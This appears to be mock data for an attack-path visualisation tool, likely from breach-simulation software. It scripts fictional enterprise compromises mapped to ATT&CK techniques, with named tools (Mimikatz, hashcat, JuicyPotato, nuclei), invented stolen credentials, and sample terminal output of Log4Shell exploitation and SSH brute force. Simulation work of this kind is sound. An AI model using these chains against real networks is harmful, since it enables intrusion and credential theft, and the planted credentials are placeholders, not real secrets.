    { edge_id: 's2-l25', edge_source: 's2-a25', edge_target: 's2-ep12', edge_type: 'asset_link' },  // AD-01 DC: creds + ports
    { edge_id: 's2-l26', edge_source: 's2-a26', edge_target: 's2-ep14', edge_type: 'asset_link' },  // MGMT-WS-01: creds + ports
    { edge_id: 's2-nmap-bulk-ep02', edge_source: 's2-a-nmap-bulk', edge_target: 's2-ep02', edge_type: 'asset_link' },
    { edge_id: 's2-nmap-bulk-ep03', edge_source: 's2-a-nmap-bulk', edge_target: 's2-ep03', edge_type: 'asset_link' },
    { edge_id: 's2-nmap-bulk-ep04', edge_source: 's2-a-nmap-bulk', edge_target: 's2-ep04', edge_type: 'asset_link' },
    { edge_id: 's2-nmap-bulk-ep05', edge_source: 's2-a-nmap-bulk', edge_target: 's2-ep05', edge_type: 'asset_link' },
    { edge_id: 's2-nmap-bulk-ep06', edge_source: 's2-a-nmap-bulk', edge_target: 's2-ep06', edge_type: 'asset_link' },
    { edge_id: 's2-nmap-bulk-ep07', edge_source: 's2-a-nmap-bulk', edge_target: 's2-ep07', edge_type: 'asset_link' },
    { edge_id: 's2-nmap-bulk-ep08', edge_source: 's2-a-nmap-bulk', edge_target: 's2-ep08', edge_type: 'asset_link' },
    { edge_id: 's2-nmap-bulk-ep11', edge_source: 's2-a-nmap-bulk', edge_target: 's2-ep11', edge_type: 'asset_link' },
    { edge_id: 's2-nmap-bulk-ep13', edge_source: 's2-a-nmap-bulk', edge_target: 's2-ep13', edge_type: 'asset_link' },
    { edge_id: 's2-nmap-bulk-ep15', edge_source: 's2-a-nmap-bulk', edge_target: 's2-ep15', edge_type: 'asset_link' },
  ],

  attack_path_stats: {
    stats_prevented: 2,
    stats_detected: 5,
    stats_undetected: 15,
    stats_pending: 0,
    stats_total_actions: 23,
    stats_executed_actions: 23,
    stats_captured_endpoints: 12,
    stats_captured_files: 8,
    stats_captured_credentials: 7,
    stats_captured_users: 5,
    stats_captured_cves: 3,
  },

  attack_path_definitions: [
    { path_id: 'p1', path_name: 'Domain Takeover', path_color: '#f44336', node_ids: ['s2-ep01', 's2-ep03', 's2-ep04', 's2-ep09', 's2-ep10', 's2-ep12'], path_outcome: 'success',
      path_segment_reasons: { 's2-ep01->s2-ep03': 'Credentials Harvested', 's2-ep03->s2-ep04': 'Kerberoasting', 's2-ep04->s2-ep09': 'Pass-the-Hash', 's2-ep09->s2-ep10': 'Port 445 (SMB)', 's2-ep10->s2-ep12': 'WMI Execution' },
      path_segment_details: {
        's2-ep01->s2-ep03': { trigger_event: 'Memory Scan Completed', condition: 'Domain credentials found in LSASS memory', action: 'Credential Dumping (Mimikatz)', tactic: 'Credential Access', technique: 'T1003.001 – LSASS Memory' },
        's2-ep03->s2-ep04': { trigger_event: 'Service Account Discovered', condition: 'SPN found in Active Directory AND TGS ticket obtained', action: 'Kerberoasting (hashcat offline crack)', tactic: 'Credential Access', technique: 'T1558.003 – Kerberoasting' },
        's2-ep04->s2-ep09': { trigger_event: 'Hash Capture Event', condition: 'NTLM hash available AND admin share accessible', action: 'Pass-the-Hash (SMB relay)', tactic: 'Lateral Movement', technique: 'T1550.002 – Pass the Hash' },
        's2-ep09->s2-ep10': { trigger_event: 'SMB Share Enumerated', condition: 'Port 445 open AND ADMIN$ share accessible', action: 'SMB Lateral Movement', tactic: 'Lateral Movement', technique: 'T1021.002 – SMB/Windows Admin Shares' },
        's2-ep10->s2-ep12': { trigger_event: 'Remote Execution Available', condition: 'WMI service running AND domain admin credentials valid', action: 'WMI Remote Execution', tactic: 'Execution', technique: 'T1047 – Windows Management Instrumentation' },
      },
    },
    { path_id: 'p2', path_name: 'Data Exfiltration', path_color: '#9c27b0', node_ids: ['s2-ep04', 's2-ep05', 's2-ep08', 's2-ep11'], path_outcome: 'success',
      path_segment_reasons: { 's2-ep04->s2-ep05': 'Port 3389 (RDP)', 's2-ep05->s2-ep08': 'Admin Share (C$)', 's2-ep08->s2-ep11': 'HTTPS Exfil (443)' },
      path_segment_details: {
        's2-ep04->s2-ep05': { trigger_event: 'RDP Service Discovered', condition: 'Port 3389 open AND stolen credentials valid for RDP', action: 'RDP Lateral Movement', tactic: 'Lateral Movement', technique: 'T1021.001 – Remote Desktop Protocol' },
        's2-ep05->s2-ep08': { trigger_event: 'File Server Discovered', condition: 'Admin share (C$) accessible with current credentials', action: 'File Staging via Admin Share', tactic: 'Collection', technique: 'T1074.001 – Local Data Staging' },
        's2-ep08->s2-ep11': { trigger_event: 'Exfil Destination Reachable', condition: 'Port 443 outbound open AND C2 beacon responding', action: 'HTTPS Data Exfiltration', tactic: 'Exfiltration', technique: 'T1048.002 – Exfiltration Over HTTPS' },
      },
    },
    { path_id: 'p3', path_name: 'Admin Access', path_color: '#2196f3', node_ids: ['s2-ep12', 's2-ep13', 's2-ep14'], path_outcome: 'success',
      path_segment_reasons: { 's2-ep12->s2-ep13': 'Token Impersonation', 's2-ep13->s2-ep14': 'DCOM Remote Exec' },
      path_segment_details: {
        's2-ep12->s2-ep13': { trigger_event: 'Privileged Process Found', condition: 'SYSTEM token available AND SeImpersonatePrivilege enabled', action: 'Token Impersonation (JuicyPotato)', tactic: 'Privilege Escalation', technique: 'T1134.001 – Token Impersonation' },
        's2-ep13->s2-ep14': { trigger_event: 'DCOM Interface Discovered', condition: 'Port 135 (RPC) open AND MMC20.Application CLSID accessible', action: 'DCOM Lateral Execution', tactic: 'Lateral Movement', technique: 'T1021.003 – Distributed Component Object Model' },
      },
    },
    // s2-ep02, s2-ep06, s2-ep07, s2-ep15 are untouched/prevented - no path
  ],
};

// ─────────────────────────────────────────────────────────────────────────────
// SCENARIO 3 – Large Enterprise Full Breach  (50 endpoints, 40 actions)
// ─────────────────────────────────────────────────────────────────────────────
//
//  Zones:
//    DMZ (5)        – dmz-web-01..03, dmz-mail-01, dmz-ftp-01
//    Perimeter (3)  – peri-proxy-01..02, peri-fw-01
//    Exec Zone (8)  – exec-ws-01..05, exec-printer-01, exec-laptop-01, exec-mac-01
//    Engineering (7)– eng-ws-01..05, eng-build-01, eng-deploy-01
//    Finance (6)    – fin-ws-01..04, fin-erp-01, fin-reporting-01
//    Server Farm (5)– srv-web-01..03, srv-api-01..02
//    Databases (5)  – db-mssql-01, db-oracle-01, db-pg-01, db-redis-01, db-mongo-01
//    Management (5) – mgmt-dc-01..02, mgmt-ca-01, mgmt-jump-01, mgmt-siem-01
//    Remote VPN (4) – vpn-remote-01..04
//    Backup/DR (2)  – backup-nfs-01, backup-tape-01
//
//  Entry   : External nmap + Nuclei on DMZ web servers
//  Blocked : peri-fw-01 admin interface, dmz-ftp-01, mgmt-siem-01
//  Untouched: vpn-remote-01..04, backup-nfs-01, backup-tape-01, db-redis-01,
//             db-mongo-01, srv-web-02..03, eng-ws-04..05
// ─────────────────────────────────────────────────────────────────────────────
export const MOCK_SCENARIO_50EP: AttackPathData = {
  attack_path_nodes: [
    // ── ASSET nodes (50) ──────────────────────────────────────────────────────

    // DMZ Zone
    { node_id: 's3-dmz-web-01', node_type: 'ASSET', node_label: 'DMZ-WEB-01', node_hostname: 'DMZ-WEB-01', node_ip: '203.0.113.10', node_platform: 'Ubuntu 20.04 LTS', node_status: 'undetected', node_user_privileges: 'www-data → root', node_accessed_files: ['/var/www/html/config.php', '/etc/passwd', '/root/.ssh/id_rsa'], node_credentials_found: ['db_user:Prod@123'], node_zone: 'DMZ', node_subnet: '203.0.113.0/24', node_is_entry_point: true, node_is_pivot: true, node_agents: ['palo_alto', 'sentinel_one'], },
    { node_id: 's3-dmz-web-02', node_type: 'ASSET', node_label: 'DMZ-WEB-02', node_hostname: 'DMZ-WEB-02', node_ip: '203.0.113.11', node_platform: 'Debian 11 (Bullseye)', node_status: 'detected', node_user_privileges: 'www-data (partial)', node_zone: 'DMZ', node_subnet: '203.0.113.0/24', node_agents: ['sentinel_one'], },
    { node_id: 's3-dmz-web-03', node_type: 'ASSET', node_label: 'DMZ-WEB-03', node_hostname: 'DMZ-WEB-03', node_ip: '203.0.113.12', node_platform: 'CentOS 8', node_status: 'undetected', node_user_privileges: 'apache → root', node_accessed_files: ['/etc/httpd/conf/httpd.conf'], node_zone: 'DMZ', node_subnet: '203.0.113.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's3-dmz-mail-01', node_type: 'ASSET', node_label: 'DMZ-MAIL-01', node_hostname: 'DMZ-MAIL-01', node_ip: '203.0.113.20', node_platform: 'Ubuntu 22.04 LTS', node_status: 'undetected', node_user_privileges: 'postfix → root', node_accessed_files: ['/var/mail/', '/etc/postfix/main.cf'], node_zone: 'DMZ', node_subnet: '203.0.113.0/24', node_agents: ['sentinel_one'], },
    { node_id: 's3-dmz-ftp-01', node_type: 'ASSET', node_label: 'DMZ-FTP-01', node_hostname: 'DMZ-FTP-01', node_ip: '203.0.113.30', node_platform: 'Ubuntu 18.04 LTS', node_status: 'prevented', node_zone: 'DMZ', node_subnet: '203.0.113.0/24', node_agents: ['sentinel_one', 'openaev'], },

    // Perimeter
    { node_id: 's3-peri-proxy-01', node_type: 'ASSET', node_label: 'PERI-PROXY-01', node_hostname: 'PERI-PROXY-01', node_ip: '10.0.0.2', node_platform: 'Ubuntu 20.04 LTS', node_status: 'undetected', node_user_privileges: 'proxy → root', node_accessed_files: ['/etc/squid/squid.conf'], node_zone: 'Perimeter', node_subnet: '10.0.0.0/24', node_is_pivot: true, node_agents: ['palo_alto', 'sentinel_one', 'openaev'], },
    { node_id: 's3-peri-proxy-02', node_type: 'ASSET', node_label: 'PERI-PROXY-02', node_hostname: 'PERI-PROXY-02', node_ip: '10.0.0.3', node_platform: 'Ubuntu 20.04 LTS', node_status: 'undetected', node_user_privileges: 'proxy → root', node_zone: 'Perimeter', node_subnet: '10.0.0.0/24', node_agents: ['openaev'], },
    { node_id: 's3-peri-fw-01', node_type: 'ASSET', node_label: 'PERI-FW-01', node_hostname: 'PERI-FW-01', node_ip: '10.0.0.1', node_platform: 'pfSense 2.7', node_status: 'prevented', node_zone: 'Perimeter', node_subnet: '10.0.0.0/24', node_agents: ['sentinel_one'], },

    // Executive Zone
    { node_id: 's3-exec-ws-01', node_type: 'ASSET', node_label: 'EXEC-WS-01', node_hostname: 'EXEC-WS-01', node_ip: '10.0.5.101', node_platform: 'Windows 11 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\ceo.anderson (User)', node_accessed_files: ['C:\\Users\\ceo.anderson\\Documents\\Board_Strategy_2025.docx'], node_zone: 'Exec Zone', node_subnet: '10.0.5.0/24', node_agents: ['openaev'], },
    { node_id: 's3-exec-ws-02', node_type: 'ASSET', node_label: 'EXEC-WS-02', node_hostname: 'EXEC-WS-02', node_ip: '10.0.5.102', node_platform: 'Windows 11 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\cfo.baker (User)', node_accessed_files: ['C:\\Finance\\M&A_Plans_Confidential.xlsx'], node_zone: 'Exec Zone', node_subnet: '10.0.5.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's3-exec-ws-03', node_type: 'ASSET', node_label: 'EXEC-WS-03', node_hostname: 'EXEC-WS-03', node_ip: '10.0.5.103', node_platform: 'Windows 11 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\cto.chen (User)', node_credentials_found: ['CORP\\svc_admin:Admin@Prod!'], node_zone: 'Exec Zone', node_subnet: '10.0.5.0/24', node_is_pivot: true, node_agents: ['palo_alto', 'openaev'], },
    { node_id: 's3-exec-ws-04', node_type: 'ASSET', node_label: 'EXEC-WS-04', node_hostname: 'EXEC-WS-04', node_ip: '10.0.5.104', node_platform: 'Windows 11 Pro', node_status: 'detected', node_zone: 'Exec Zone', node_subnet: '10.0.5.0/24', node_agents: ['palo_alto'], },
    { node_id: 's3-exec-ws-05', node_type: 'ASSET', node_label: 'EXEC-WS-05', node_hostname: 'EXEC-WS-05', node_ip: '10.0.5.105', node_platform: 'Windows 11 Pro', node_status: 'pending', node_zone: 'Exec Zone', node_subnet: '10.0.5.0/24', node_untouched: true, node_agents: ['openaev'], },
    { node_id: 's3-exec-printer-01', node_type: 'ASSET', node_label: 'EXEC-PRINTER-01', node_hostname: 'EXEC-PRINTER-01', node_ip: '10.0.5.20', node_platform: 'Windows Server 2016', node_status: 'undetected', node_user_privileges: 'CORP\\svc_print', node_accessed_files: ['C:\\Windows\\System32\\spool\\'], node_credentials_found: ['CORP\\svc_mssql:Sql#2024'], node_zone: 'Exec Zone', node_subnet: '10.0.5.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's3-exec-laptop-01', node_type: 'ASSET', node_label: 'EXEC-LAPTOP-01', node_hostname: 'EXEC-LAPTOP-01', node_ip: '10.0.5.150', node_platform: 'Windows 11 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\vp.sales (User)', node_zone: 'Exec Zone', node_subnet: '10.0.5.0/24', node_agents: ['palo_alto'], },
    { node_id: 's3-exec-mac-01', node_type: 'ASSET', node_label: 'EXEC-MAC-01', node_hostname: 'EXEC-MAC-01', node_ip: '10.0.5.160', node_platform: 'macOS Ventura 13.6', node_status: 'undetected', node_user_privileges: 'localadmin', node_zone: 'Exec Zone', node_subnet: '10.0.5.0/24', node_agents: ['palo_alto'], },

    // Engineering Zone
    { node_id: 's3-eng-ws-01', node_type: 'ASSET', node_label: 'ENG-WS-01', node_hostname: 'ENG-WS-01', node_ip: '10.0.10.101', node_platform: 'Windows 10 Enterprise', node_status: 'undetected', node_user_privileges: 'CORP\\eng.dev01 (User)', node_accessed_files: ['C:\\dev\\api\\src\\config.json'], node_zone: 'Engineering', node_subnet: '10.0.10.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's3-eng-ws-02', node_type: 'ASSET', node_label: 'ENG-WS-02', node_hostname: 'ENG-WS-02', node_ip: '10.0.10.102', node_platform: 'Windows 10 Enterprise', node_status: 'undetected', node_user_privileges: 'CORP\\eng.dev02 (User)', node_credentials_found: ['gitlab_token:glpat-xxxx'], node_zone: 'Engineering', node_subnet: '10.0.10.0/24', node_agents: ['openaev'], },
    { node_id: 's3-eng-ws-03', node_type: 'ASSET', node_label: 'ENG-WS-03', node_hostname: 'ENG-WS-03', node_ip: '10.0.10.103', node_platform: 'Windows 10 Enterprise', node_status: 'detected', node_zone: 'Engineering', node_subnet: '10.0.10.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's3-eng-ws-04', node_type: 'ASSET', node_label: 'ENG-WS-04', node_hostname: 'ENG-WS-04', node_ip: '10.0.10.104', node_platform: 'Windows 10 Enterprise', node_status: 'pending', node_zone: 'Engineering', node_subnet: '10.0.10.0/24', node_untouched: true, node_agents: ['palo_alto'], },
    { node_id: 's3-eng-ws-05', node_type: 'ASSET', node_label: 'ENG-WS-05', node_hostname: 'ENG-WS-05', node_ip: '10.0.10.105', node_platform: 'Windows 10 Enterprise', node_status: 'pending', node_zone: 'Engineering', node_subnet: '10.0.10.0/24', node_untouched: true, node_agents: ['palo_alto'], },
    { node_id: 's3-eng-build-01', node_type: 'ASSET', node_label: 'ENG-BUILD-01', node_hostname: 'ENG-BUILD-01', node_ip: '10.0.10.20', node_platform: 'Ubuntu 22.04 LTS', node_status: 'undetected', node_user_privileges: 'jenkins → root', node_accessed_files: ['/var/jenkins_home/config.xml', '/etc/jenkins/credentials.xml'], node_credentials_found: ['jenkins_admin:Jenkins@2024'], node_zone: 'Engineering', node_subnet: '10.0.10.0/24', node_is_pivot: true, node_agents: ['palo_alto', 'sentinel_one', 'openaev'], },
    { node_id: 's3-eng-deploy-01', node_type: 'ASSET', node_label: 'ENG-DEPLOY-01', node_hostname: 'ENG-DEPLOY-01', node_ip: '10.0.10.21', node_platform: 'Ubuntu 22.04 LTS', node_status: 'undetected', node_user_privileges: 'deploy → root', node_accessed_files: ['/etc/kubernetes/admin.conf'], node_zone: 'Engineering', node_subnet: '10.0.10.0/24', node_agents: ['sentinel_one', 'openaev'], },

    // Finance Zone
    { node_id: 's3-fin-ws-01', node_type: 'ASSET', node_label: 'FIN-WS-01', node_hostname: 'FIN-WS-01', node_ip: '10.0.15.101', node_platform: 'Windows 10 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\fin.acct01 (User)', node_accessed_files: ['C:\\Finance\\Annual_Report_2024.xlsx'], node_zone: 'Finance', node_subnet: '10.0.15.0/24', node_agents: ['openaev'], },
    { node_id: 's3-fin-ws-02', node_type: 'ASSET', node_label: 'FIN-WS-02', node_hostname: 'FIN-WS-02', node_ip: '10.0.15.102', node_platform: 'Windows 10 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\fin.acct02 (User)', node_zone: 'Finance', node_subnet: '10.0.15.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's3-fin-ws-03', node_type: 'ASSET', node_label: 'FIN-WS-03', node_hostname: 'FIN-WS-03', node_ip: '10.0.15.103', node_platform: 'Windows 10 Pro', node_status: 'pending', node_zone: 'Finance', node_subnet: '10.0.15.0/24', node_untouched: true, node_agents: ['sentinel_one'], },
    { node_id: 's3-fin-ws-04', node_type: 'ASSET', node_label: 'FIN-WS-04', node_hostname: 'FIN-WS-04', node_ip: '10.0.15.104', node_platform: 'Windows 10 Pro', node_status: 'pending', node_zone: 'Finance', node_subnet: '10.0.15.0/24', node_untouched: true, node_agents: ['openaev'], },
    { node_id: 's3-fin-erp-01', node_type: 'ASSET', node_label: 'FIN-ERP-01', node_hostname: 'FIN-ERP-01', node_ip: '10.0.15.10', node_platform: 'Windows Server 2019', node_status: 'undetected', node_user_privileges: 'CORP\\svc_erp (Service Account)', node_accessed_files: ['D:\\ERP\\data\\financial_records.mdb'], node_credentials_found: ['erp_sa:Erp@Corp2024'], node_zone: 'Finance', node_subnet: '10.0.15.0/24', node_agents: ['openaev'], },
    { node_id: 's3-fin-reporting-01', node_type: 'ASSET', node_label: 'FIN-REPORTING-01', node_hostname: 'FIN-REPORTING-01', node_ip: '10.0.15.11', node_platform: 'Windows Server 2019', node_status: 'detected', node_user_privileges: 'CORP\\svc_reporting (partial)', node_zone: 'Finance', node_subnet: '10.0.15.0/24', node_agents: ['sentinel_one', 'openaev'], },

    // Server Farm – Web/API
    { node_id: 's3-srv-web-01', node_type: 'ASSET', node_label: 'SRV-WEB-01', node_hostname: 'SRV-WEB-01', node_ip: '10.0.20.11', node_platform: 'Ubuntu 20.04 LTS', node_status: 'undetected', node_user_privileges: 'www-data → root', node_accessed_files: ['/var/www/app/config/database.yml'], node_zone: 'Server Farm', node_subnet: '10.0.20.0/24', node_agents: ['palo_alto', 'sentinel_one'], },
    { node_id: 's3-srv-web-02', node_type: 'ASSET', node_label: 'SRV-WEB-02', node_hostname: 'SRV-WEB-02', node_ip: '10.0.20.12', node_platform: 'Ubuntu 20.04 LTS', node_status: 'pending', node_zone: 'Server Farm', node_subnet: '10.0.20.0/24', node_untouched: true, node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's3-srv-web-03', node_type: 'ASSET', node_label: 'SRV-WEB-03', node_hostname: 'SRV-WEB-03', node_ip: '10.0.20.13', node_platform: 'Ubuntu 20.04 LTS', node_status: 'pending', node_zone: 'Server Farm', node_subnet: '10.0.20.0/24', node_untouched: true, node_agents: ['palo_alto', 'sentinel_one'], },
    { node_id: 's3-srv-api-01', node_type: 'ASSET', node_label: 'SRV-API-01', node_hostname: 'SRV-API-01', node_ip: '10.0.20.21', node_platform: 'RHEL 8.6', node_status: 'undetected', node_user_privileges: 'appuser → root', node_accessed_files: ['/opt/api/config/production.yml'], node_credentials_found: ['redis_pass:R3dis@Prod'], node_zone: 'Server Farm', node_subnet: '10.0.20.0/24', node_agents: ['palo_alto', 'sentinel_one'], },
    { node_id: 's3-srv-api-02', node_type: 'ASSET', node_label: 'SRV-API-02', node_hostname: 'SRV-API-02', node_ip: '10.0.20.22', node_platform: 'RHEL 8.6', node_status: 'undetected', node_user_privileges: 'appuser → root', node_zone: 'Server Farm', node_subnet: '10.0.20.0/24', node_agents: ['palo_alto', 'sentinel_one', 'openaev'], },

    // Databases
    { node_id: 's3-db-mssql-01', node_type: 'ASSET', node_label: 'DB-MSSQL-01', node_hostname: 'DB-MSSQL-01', node_ip: '10.0.21.10', node_platform: 'Windows Server 2019', node_status: 'undetected', node_user_privileges: 'sa (SQL Admin)', node_accessed_files: ['D:\\MSSQL\\DATA\\ProductionDB.mdf'], node_credentials_found: ['sa:Admin@123', 'app_db:AppDB@2024'], node_zone: 'Databases', node_subnet: '10.0.21.0/24', node_agents: ['sentinel_one'], },
    { node_id: 's3-db-oracle-01', node_type: 'ASSET', node_label: 'DB-ORACLE-01', node_hostname: 'DB-ORACLE-01', node_ip: '10.0.21.11', node_platform: 'Oracle Linux 8', node_status: 'undetected', node_user_privileges: 'oracle → root', node_accessed_files: ['/u01/app/oracle/oradata/'], node_credentials_found: ['SYS:Change_on_install'], node_zone: 'Databases', node_subnet: '10.0.21.0/24', node_agents: ['sentinel_one'], },
    { node_id: 's3-db-pg-01', node_type: 'ASSET', node_label: 'DB-PG-01', node_hostname: 'DB-PG-01', node_ip: '10.0.21.12', node_platform: 'Ubuntu 22.04 LTS', node_status: 'detected', node_zone: 'Databases', node_subnet: '10.0.21.0/24', node_agents: ['sentinel_one'], },
    { node_id: 's3-db-redis-01', node_type: 'ASSET', node_label: 'DB-REDIS-01', node_hostname: 'DB-REDIS-01', node_ip: '10.0.21.13', node_platform: 'Ubuntu 20.04 LTS', node_status: 'pending', node_zone: 'Databases', node_subnet: '10.0.21.0/24', node_untouched: true, node_agents: ['sentinel_one'], },
    { node_id: 's3-db-mongo-01', node_type: 'ASSET', node_label: 'DB-MONGO-01', node_hostname: 'DB-MONGO-01', node_ip: '10.0.21.14', node_platform: 'Ubuntu 20.04 LTS', node_status: 'pending', node_zone: 'Databases', node_subnet: '10.0.21.0/24', node_untouched: true, node_agents: ['sentinel_one', 'openaev'], },

    // Management Zone
    { node_id: 's3-mgmt-dc-01', node_type: 'ASSET', node_label: 'MGMT-DC-01', node_hostname: 'MGMT-DC-01', node_ip: '10.0.30.5', node_platform: 'Windows Server 2022', node_status: 'undetected', node_user_privileges: 'CORP\\Administrator (Domain Admin)', node_accessed_files: [], node_credentials_found: ['All 1,247 domain accounts (NTDS.dit)', 'CORP\\Administrator:$HASH$'], node_zone: 'Management', node_subnet: '10.0.30.0/24', node_is_pivot: true, node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's3-mgmt-dc-02', node_type: 'ASSET', node_label: 'MGMT-DC-02', node_hostname: 'MGMT-DC-02', node_ip: '10.0.30.6', node_platform: 'Windows Server 2022', node_status: 'undetected', node_user_privileges: 'CORP\\Administrator (Domain Admin)', node_credentials_found: ['CORP\\svc_backup:Backup@2024!'], node_zone: 'Management', node_subnet: '10.0.30.0/24', node_agents: ['openaev'], },
    { node_id: 's3-mgmt-ca-01', node_type: 'ASSET', node_label: 'MGMT-CA-01', node_hostname: 'MGMT-CA-01', node_ip: '10.0.30.10', node_platform: 'Windows Server 2022', node_status: 'detected', node_user_privileges: 'CORP\\svc_ca (partial)', node_zone: 'Management', node_subnet: '10.0.30.0/24', node_agents: ['palo_alto'], },
    { node_id: 's3-mgmt-jump-01', node_type: 'ASSET', node_label: 'MGMT-JUMP-01', node_hostname: 'MGMT-JUMP-01', node_ip: '10.0.30.20', node_platform: 'Windows Server 2019', node_status: 'undetected', node_user_privileges: 'CORP\\svc_jumphost (Local Admin)', node_zone: 'Management', node_subnet: '10.0.30.0/24', node_agents: ['sentinel_one'], },
    { node_id: 's3-mgmt-siem-01', node_type: 'ASSET', node_label: 'MGMT-SIEM-01', node_hostname: 'MGMT-SIEM-01', node_ip: '10.0.30.50', node_platform: 'Ubuntu 22.04 LTS', node_status: 'prevented', node_zone: 'Management', node_subnet: '10.0.30.0/24', node_agents: ['sentinel_one'], },

    // Remote VPN (untouched – beyond attack range)
    { node_id: 's3-vpn-remote-01', node_type: 'ASSET', node_label: 'VPN-REMOTE-01', node_hostname: 'VPN-REMOTE-01', node_ip: '172.16.0.101', node_platform: 'Windows 10 Pro', node_status: 'pending', node_zone: 'Remote VPN', node_subnet: '172.16.0.0/24', node_untouched: true, node_agents: ['palo_alto'], },
    { node_id: 's3-vpn-remote-02', node_type: 'ASSET', node_label: 'VPN-REMOTE-02', node_hostname: 'VPN-REMOTE-02', node_ip: '172.16.0.102', node_platform: 'macOS Sonoma 14', node_status: 'pending', node_zone: 'Remote VPN', node_subnet: '172.16.0.0/24', node_untouched: true, node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's3-vpn-remote-03', node_type: 'ASSET', node_label: 'VPN-REMOTE-03', node_hostname: 'VPN-REMOTE-03', node_ip: '172.16.0.103', node_platform: 'Windows 11 Pro', node_status: 'pending', node_zone: 'Remote VPN', node_subnet: '172.16.0.0/24', node_untouched: true, node_agents: ['openaev'], },
    { node_id: 's3-vpn-remote-04', node_type: 'ASSET', node_label: 'VPN-REMOTE-04', node_hostname: 'VPN-REMOTE-04', node_ip: '172.16.0.104', node_platform: 'Ubuntu 22.04 LTS', node_status: 'pending', node_zone: 'Remote VPN', node_subnet: '172.16.0.0/24', node_untouched: true, node_agents: ['openaev'], },

    // Backup / DR (untouched – isolated segment)
    { node_id: 's3-backup-nfs-01', node_type: 'ASSET', node_label: 'BACKUP-NFS-01', node_hostname: 'BACKUP-NFS-01', node_ip: '10.0.40.10', node_platform: 'FreeBSD 14', node_status: 'pending', node_zone: 'Backup/DR', node_subnet: '10.0.40.0/24', node_untouched: true, node_agents: ['openaev'], },
    { node_id: 's3-backup-tape-01', node_type: 'ASSET', node_label: 'BACKUP-TAPE-01', node_hostname: 'BACKUP-TAPE-01', node_ip: '10.0.40.20', node_platform: 'Windows Server 2016', node_status: 'pending', node_zone: 'Backup/DR', node_subnet: '10.0.40.0/24', node_untouched: true, node_agents: ['sentinel_one', 'openaev'], },

    // ── ACTION nodes (40) ──────────────────────────────────────────────────────

    // Phase 1 – External Recon & DMZ Foothold (8 actions)
    { node_id: 's3-a01', node_type: 'ACTION', node_label: 'Nmap TCP SYN Scan', node_status: 'undetected', node_payload_name: 'nmap – TCP SYN Scan', node_executed_at: '2025-03-05T03:00:00Z', node_agent: 'openaev', node_ip: '203.0.113.10',
      node_terminal_output: `Nmap scan report for DMZ-WEB-01 (203.0.113.10)\nHOST: up | Ports: 22,80,443,8080,8443 open\nNmap done: 1 IP in 2.8s`,
      node_ports_found:['22/tcp open ssh OpenSSH 8.4p1', '80/tcp open http Apache 2.4.51', '443/tcp open ssl/https Apache 2.4.51', '8080/tcp open http Tomcat 9.0.54'] },
    { node_id: 's3-a02', node_type: 'ACTION', node_label: 'Nuclei Log4Shell RCE', node_status: 'undetected', node_payload_name: 'nuclei – CVE-2021-44228', node_executed_at: '2025-03-05T03:03:10Z', node_agent: 'sentinel_one', node_ip: '203.0.113.10', node_user_privileges: 'www-data → root', node_accessed_files: ['/var/www/html/config.php', '/root/.ssh/id_rsa'],
      node_terminal_output: `[CVE-2021-44228] [critical] http://203.0.113.10:8080/login\n[+] JNDI callback from 203.0.113.10 — RCE confirmed\n[+] whoami: www-data → sudo privesc → root\n[+] /root/.ssh/id_rsa extracted (RSA 4096)`,
      node_cves_found:['CVE-2021-44228 (Log4Shell JNDI Injection) - CRITICAL', 'CVE-2021-45046 (Log4j2 Deserialization RCE) - CRITICAL'] },
    { node_id: 's3-a03', node_type: 'ACTION', node_label: 'Nuclei ProxyShell CVE', node_status: 'detected', node_payload_name: 'nuclei – CVE-2021-34473', node_executed_at: '2025-03-05T03:06:22Z', node_agent: 'sentinel_one', node_ip: '203.0.113.11',
      node_terminal_output: `[CVE-2021-34473] [critical] https://203.0.113.11/autodiscover/\n[!] DETECTION: WAF blocked exploit payload\n[!] Alert: EXCHANGE_PROXYSHELL attempt detected by WAF rule 1044\n[-] Attack detected before code execution` },
    { node_id: 's3-a04', node_type: 'ACTION', node_label: 'NetExec FTP Brute-Force', node_status: 'prevented', node_payload_name: 'netexec – FTP brute force', node_executed_at: '2025-03-05T03:08:45Z', node_agent: 'palo_alto', node_ip: '203.0.113.30',
      node_terminal_output: `FTP   203.0.113.30  21     DMZ-FTP-01    [*] Trying anonymous:anonymous ... FAILED\nFTP   203.0.113.30  21     DMZ-FTP-01    [*] Trying admin:admin123 ... FAILED\n[!] PREVENTION: fail2ban triggered after 2 attempts — IP banned` },
    { node_id: 's3-a05', node_type: 'ACTION', node_label: 'NetExec SSH Mail Relay', node_status: 'undetected', node_payload_name: 'netexec – SSH login', node_executed_at: '2025-03-05T03:11:30Z', node_agent: 'palo_alto', node_ip: '203.0.113.20', node_user_privileges: 'postfix → root',
      node_terminal_output: `SSH   203.0.113.20  22     DMZ-MAIL-01   [+] postfix:s3cr3t@dm1n — SUCCESS\nSSH   203.0.113.20  22     DMZ-MAIL-01   [+] Privesc via SUID binary: uid=0(root)\nSSH   203.0.113.20  22     DMZ-MAIL-01   [+] /etc/postfix/main.cf extracted` },
    { node_id: 's3-a06', node_type: 'ACTION', node_label: 'Nmap FIN Scan (DMZ-WEB-03)', node_status: 'undetected', node_payload_name: 'nmap – FIN Scan', node_executed_at: '2025-03-05T03:14:05Z', node_agent: 'openaev', node_ip: '203.0.113.12',
      node_terminal_output: `Nmap FIN scan (evasion) on DMZ-WEB-03 (203.0.113.12)\nPORTs open: 22,80,443,8080\nFirewall: stateless (FIN scan undetected)\nNmap done in 1.9s`,
      node_ports_found:['22/tcp open ssh OpenSSH 7.4p1', '443/tcp open ssl/https Apache 2.4.51', '8443/tcp open ssl/https-alt Roundcube'] },
